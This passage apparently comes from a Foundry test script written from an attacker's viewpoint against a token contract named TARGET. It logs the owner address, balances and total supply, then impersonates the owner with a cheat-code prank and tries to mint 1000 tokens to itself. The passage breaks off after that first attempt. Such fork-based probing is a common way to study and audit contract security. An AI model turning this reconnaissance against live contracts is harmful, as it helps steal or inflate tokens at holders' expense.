        );
        address contractOwner = abi.decode(ownerData, (address));
        console.log("Contract owner:", contractOwner);
        vm.label(contractOwner, "ContractOwner");

        // Check if owner is a contract
        uint32 ownerSize;
        assembly {
            ownerSize := extcodesize(contractOwner)
        }
        console.log("Owner code size:", ownerSize);

        // Check our initial token balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(address(this));
        console.log("Initial attacker token balance:", initialBalance);

        // Check total supply
        uint256 totalSupply = IERC20(TARGET).totalSupply();
        console.log("Total supply:", totalSupply);

        // If owner is a contract, maybe it has vulnerable functions
        // Let's impersonate the owner and see what we can do
        vm.startPrank(contractOwner);

        // Try to mint more tokens - maybe owner has mint function
        // Some token contracts have mint functions only for owner
        (bool success1, ) = TARGET.call(
            abi.encodeWithSignature("mint(address,uint256)", address(this), 1000 ether)
        );
        console.log("Owner mint attempt 1:", success1);

